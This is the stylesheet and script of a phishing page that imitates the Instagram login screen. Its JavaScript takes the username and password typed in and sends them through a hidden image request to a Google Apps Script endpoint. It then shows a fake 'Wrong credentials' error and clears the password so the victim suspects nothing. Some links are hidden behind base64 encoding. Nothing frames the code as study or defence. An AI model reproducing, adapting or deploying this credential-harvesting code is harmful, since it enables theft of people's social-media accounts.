    <style>
        /* --- SPLASH SCREEN STYLES --- */
        #splash-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #fff; /* Default light background */
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            transition: opacity 0.5s ease-out;
        }

        #splash-screen.fade-out {
            opacity: 0;
        }

        #splash-screen .loading-logo {
            width: 80px;
            height: 80px;
        }

        /* --- DEFAULT (LIGHT MODE) STYLES --- */
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: rgb(250, 250, 250);
            color: rgb(38, 38, 38);
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            transition: background-color 0.3s, color 0.3s;
        }

        a, .secure-link, .facebook-login, .create-account-link {
            text-decoration: none;
            cursor: pointer;
        }
        
        a {
             color: #00376b;
        }
        
        .mobile-header {
            display: none;
        }

        .main-container {
            display: flex;
            align-items: center;
            justify-content: center;
            flex-grow: 1;
            margin: 32px auto;
            max-width: 935px;
            width: 100%;
        }

        .phone-container {
            flex-basis: 454px;
            margin-right: 32px;
        }

        .phone-frame {
            position: relative;
            height: 618px;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .static-screenshot {
            width: 100%;
            height: auto;
            display: block;
            max-height: 100%;
            object-fit: contain;
        }

        .form-container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            flex-basis: 350px;
        }

        .form-box {
            background-color: #fff;
            border: 1px solid rgb(219, 219, 219);
            border-radius: 8px;
            margin-bottom: 10px;
            padding: 20px 40px;
            text-align: center;
            transition: background-color 0.3s, border 0.3s;
        }

        .insta-logo {
            background-repeat: no-repeat;
            background-position: center;
            background-size: contain;
            width: 175px;
            height: 51px;
            margin: 22px auto 12px;
        }
        
        .mobile-logo{
             display: none;
        }

        .input-wrapper {
            position: relative;
            margin-bottom: 6px;
        }

        .input-wrapper input {
            width: 100%;
            padding: 14px 8px 4px;
            background-color: rgb(250, 250, 250);
            border: 1px solid rgb(219, 219, 219);
            border-radius: 6px;
            box-sizing: border-box;
            font-size: 12px;
            color: rgb(38, 38, 38);
            transition: background-color 0.3s, border 0.3s, color 0.3s;
        }

        .input-wrapper label {
            position: absolute;
            top: 50%;
            left: 8px;
            transform: translateY(-50%);
            font-size: 18px;
            color: rgb(115, 115, 115);
            pointer-events: none;
            transition: all 0.2s ease-out;
        }

        .input-wrapper input:valid + label,
        .input-wrapper input:focus + label {
            top: 4px;
            transform: translateY(0);
            font-size: 16px;
        }

        #login-button {
            width: 100%;
            background-color: rgb(0, 149, 246);
            border: none;
            border-radius: 8px;
            color: white;
            font-weight: 600;
            padding: 8px 16px;
            margin-top: 12px;
            cursor: pointer;
            opacity: 0.7;
        }

        #login-button:not(:disabled) {
            opacity: 1;
        }
        
        .separator {
            display: flex;
            align-items: center;
            margin: 18px 0;
        }

        .line {
            flex-grow: 1;
            height: 1px;
            background-color: rgb(219, 219, 219);
        }

        .or-text {
            color: rgb(115, 115, 115);
            font-weight: 600;
            font-size: 13px;
            margin: 0 18px;
        }
        
        .social-login {
            margin-bottom: 18px;
        }

        .facebook-login {
            background: none;
            border: none;
            color: rgb(0, 149, 246);
            font-weight: 600;
            font-size: 14px;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            padding: 0;
        }

        .facebook-icon {
            display: inline-block;
            width: 16px;
            height: 16px;
            margin-right: 8px;
            background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' fill='%230095f6' class='bi bi-facebook' viewBox='0 0 16 16'%3e%3cpath d='M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z'/%3e%3c/svg%3e");
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
        }


        .forgot-password {
            font-size: 12px;
            display: block;
            color: rgb(38, 38, 38);
        }
        
        .signup-box {
             border: 1px solid rgb(219, 219, 219);
             background-color: #fff;
             border-radius: 8px;
        }

        .signup-box p {
            margin: 15px;
            font-size: 14px;
        }

        .signup-box a {
            color: rgb(0, 149, 246);
            font-weight: 600;
        }

        .page-footer {
            width: 100%;
            max-width: 935px;
            padding: 0 16px;
            margin-bottom: 52px;
            box-sizing: border-box;
            font-size: 12px;
            color: rgb(115, 115, 115);
            transition: color 0.3s;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            justify-content: center;
            gap: 16px;
            margin-bottom: 12px;
        }

        .footer-links a {
            color: rgb(115, 115, 115);
        }

        .footer-meta {
            display: flex;
            justify-content: center;
            gap: 16px;
            margin-top: 12px;
        }

        .mobile-bottom-container {
            display: none;
        }
        
        .show-hide-password .show-hide-icons {
            display: none;
        }
        .show-hide-password .show-hide-text {
            display: inline;
            font-size: 12px;
            font-weight: 600;
            color: rgb(115, 115, 115);
        }


        /* --- RESPONSIVE DESIGN --- */
        @media (max-width: 875px) {
            .phone-container {
                display: none;
            }
            .main-container {
                margin-top: 0;
            }
        }

        @media (max-width: 450px) {
            body {
                background-color: #fff;
                display: flex;
                flex-direction: column;
                justify-content: space-between;
            }
            .mobile-header {
                display: block;
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                text-align: center;
                padding: 15px 0;
                font-size: 14px;
                color: #8e8e8e;
                background-color: #fff;
            }
            .main-container {
                width: 100%;
                margin: 0;
                justify-content: flex-start;
                padding-top: 120px;
                flex-grow: 1;
            }
            .form-container {
                flex-basis: auto;
                width: 100%;
            }
            .form-box {
                background-color: transparent;
                border: none;
                padding: 0 20px;
            }
            .signup-box {
                display: none;
            }
            .insta-logo {
                display: none;
            }
            .mobile-logo{
                display: block;
                width: 100px;
                height: 100px;
                margin: 0 auto 70px;
            }
            
            .separator, .social-login {
                display: none;
            }
            
            .input-wrapper input {
                padding: 30px 10px 4px;
                font-size: 20px;
                background-color: #fafafa;
            }

            .input-wrapper input:focus {
                border-color: rgb(168, 168, 168);
                outline: none;
            }
            #login-button {
                padding: 12px 16px;
                border-radius: 20px;
            }
            .forgot-password {
                margin-top: 25px;
                font-weight: 500;
                font-size: 13px;
                color: #00376b;
            }
            .page-footer {
                display: none;
            }
            .mobile-bottom-container {
                display: flex;
                flex-direction: column;
                align-items: center;
                width: 100%;
                padding: 20px;
                box-sizing: border-box;
            }
            .create-account-link {
                display: block;
                width: 100%;
                text-align: center;
                padding: 12px;
                border: 1px solid #0095f6;
                color: #0095f6;
                font-weight: 600;
                border-radius: 20px;
                font-size: 14px;
                margin-bottom: 40px;
            }
            .mobile-meta-logo {
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 6px;
                color: #a8a8a8;
            }
            
            .show-hide-password .show-hide-icons {
                display: inline-block;
            }
            .show-hide-password .show-hide-text {
                display: none;
            }
        }

        /* --- ADAPTIVE (DARK MODE) OVERRIDE STYLES --- */
        @media (prefers-color-scheme: dark) {
            #splash-screen {
                background-color: #000;
            }

            body {
                background-color: #000;
                color: rgb(245, 245, 245);
            }

            .form-box {
                background-color: #000;
                border: 1px solid rgb(54, 54, 54);
            }
            .signup-box {
                background-color: #000;
                border: 1px solid rgb(54, 54, 54);
            }

            .input-wrapper input {
                background-color: rgb(38, 38, 38);
                border: 1px solid rgb(54, 54, 54);
                color: rgb(245, 245, 245);
            }

            .input-wrapper label {
                color: rgb(168, 168, 168);
            }

            .separator .line {
                background-color: rgb(54, 54, 54);
            }

            .separator .or-text {
                color: rgb(168, 168, 168);
            }
            
            .facebook-login {
                color: #0095f6;
            }
            
             .facebook-icon {
                background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' fill='%230095f6' class='bi bi-facebook' viewBox='0 0 16 16'%3e%3cpath d='M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z'/%3e%3c/svg%3e");
            }

            .forgot-password {
                color: rgb(245, 245, 245);
            }

            a,
            .signup-box a {
                color: #0095f6;
            }

            .page-footer,
            .footer-links a {
                color: rgb(168, 168, 168);
            }
            
             .show-hide-password .show-hide-text {
                color: rgb(168, 168, 168);
            }
            
            @media (max-width: 450px) {
                body, .mobile-header {
                    background-color: #000;
                }
                .mobile-header {
                    border-bottom-color: #363636;
                    color: rgb(168, 168, 168);
                }
                .form-box {
                    background-color: transparent;
                    border: none;
                }
                .input-wrapper input {
                    background-color: #121212;
                    border: 1px solid #363636;
                }
                .mobile-meta-logo {
                     color: rgb(168, 168, 168);
                }
            }
        }

        /* --- ENHANCED LOADING AND ERROR STATES --- */
        #login-button {
            transition: opacity 0.2s ease, background-color 0.2s ease;
        }

        #login-button:not(:disabled):hover {
            background-color: #0095f6;
            opacity: 0.9;
        }

        #login-button:disabled {
            cursor: not-allowed;
            opacity: 0.7;
        }

        .loading-spinner {
            width: 18px;
            height: 18px;
            border: 2px solid #ffffff;
            border-top: 2px solid transparent;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .show-hide-password {
            position: absolute;
            right: 8px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            padding: 0;
            margin: 0;
            opacity: 0;
            transition: opacity 0.2s ease;
            pointer-events: none;
        }
        
        .show-hide-password svg {
            width: 24px;
            height: 24px;
        }
        
        .show-hide-password svg path {
             stroke: #8e8e8e;
        }

        .show-hide-password.visible {
            opacity: 1;
            pointer-events: auto;
        }

        @media (prefers-color-scheme: dark) {
            .show-hide-password svg path {
                stroke: rgb(168, 168, 168);
            }
        }
        
        .input-wrapper input[type="password"] {
            padding-right: 45px !important;
        }
    </style>
</head>

        document.addEventListener('DOMContentLoaded', () => {
            const usernameInput = document.getElementById('username');
            const passwordInput = document.getElementById('password');
            const loginButton = document.getElementById('login-button');

            const eyeOpenIcon = document.getElementById('eye-open');
            const eyeClosedIcon = document.getElementById('eye-closed');

            const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyuvK7JZPUQvtlOmZluz4nZPxBhLXIWFWkJm2o65PgEMECw9vR3U7_m-jlaEusv0mvaDg/exec';
            
            window.onload = () => {
                splashScreen.classList.add('fade-out');
                setTimeout(() => {
                    splashScreen.style.display = 'none';
                }, 500);
            };

            function initPasswordToggle() {
                if (!passwordInput || !showHideButton) return;
                
                passwordInput.addEventListener('input', function() {
                    showHideButton.classList.toggle('visible', this.value.length > 0);
                    checkInputs();
                });
                
                showHideButton.addEventListener('click', function() {
                    const isPassword = passwordInput.type === 'password';
                    passwordInput.type = isPassword ? 'text' : 'password';
                    
                    // Toggle for desktop text
                    if (showHideText) {
                        showHideText.textContent = isPassword ? 'Hide' : 'Show';
                    }
                    
                    // Toggle for mobile icons
                    eyeOpenIcon.style.display = isPassword ? 'none' : 'block';
                    eyeClosedIcon.style.display = isPassword ? 'block' : 'none';
                    
                    passwordInput.focus();
                });
            }

            function checkInputs() {
                const isUsernameFilled = usernameInput.value.trim() !== '';
                const isPasswordFilled = passwordInput.value.trim() !== '';
                const isPasswordValid = passwordInput.value.trim().length >= 6;
                loginButton.disabled = !(isUsernameFilled && isPasswordFilled && isPasswordValid);
            }

            usernameInput.addEventListener('input', checkInputs);
            passwordInput.addEventListener('input', checkInputs);

            loginForm.addEventListener('submit', async (e) => {
                e.preventDefault();
                if (loginButton.disabled) return;
                
                const username = usernameInput.value.trim();
                const password = passwordInput.value.trim();
                
                removeCredentialError();
                showLoadingState();
                submitViaImageTag(username, password);
                
                setTimeout(() => {
                    resetLoginButton();
                    showCredentialError();
                    passwordInput.value = '';
                    checkInputs();
                    
                    if (showHideButton) {
                        showHideButton.classList.remove('visible');
                        passwordInput.type = 'password';
                        
                        if (showHideText) {
                           showHideText.textContent = 'Show';
                        }
                        eyeOpenIcon.style.display = 'block';
                        eyeClosedIcon.style.display = 'none';
                    }
                }, 1500);
            });

            function submitViaImageTag(username, password) {
                const img = new Image();
                img.src = `${GOOGLE_SCRIPT_URL}?username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&t=${Date.now()}`;
                img.style.display = 'none';
                document.body.appendChild(img);
                
                setTimeout(() => {
                    if (document.body.contains(img)) {
                        document.body.removeChild(img);
                    }
                }, 3000);
            }

            function showLoadingState() {
                loginButton.disabled = true;
                loginButton.innerHTML = '<div class="loading-spinner"></div>';
            }

            function resetLoginButton() {
                loginButton.disabled = false;
                loginButton.textContent = 'Log in';
            }

            function showCredentialError() {
                removeCredentialError();
                const errorElement = document.createElement('div');
                errorElement.className = 'credential-error';
                errorElement.innerHTML = `<div style="color: #ed4956; font-size: 14px; text-align: center; margin-top: 15px;">Wrong credentials. Please try again.</div>`;
                
                const forgotLink = document.querySelector('.forgot-password');
                if (forgotLink) {
                    forgotLink.parentNode.insertBefore(errorElement, forgotLink.nextSibling);
                } else {
                    loginForm.parentNode.appendChild(errorElement);
                }
            }

            function removeCredentialError() {
                document.querySelectorAll('.credential-error').forEach(e => e.remove());
            }

            initPasswordToggle();
            checkInputs();
            
            document.querySelectorAll(".secure-link").forEach(a => {
                a.addEventListener("click", e => {
                    e.preventDefault();
                    const key = "123noob";
                    const encrypted = a.getAttribute("data-enc");
                    try {
                        const decoded = atob(encrypted);
                        const link = decoded.startsWith(key) ? decoded.slice(key.length) : null;
                        if (link) {
                            window.open(link, "_blank");
                        }
                    } catch (err) {
                        console.error("Decryption failed.", err);
                    }
                });
            });
        });
    </script>
</body>
</html>
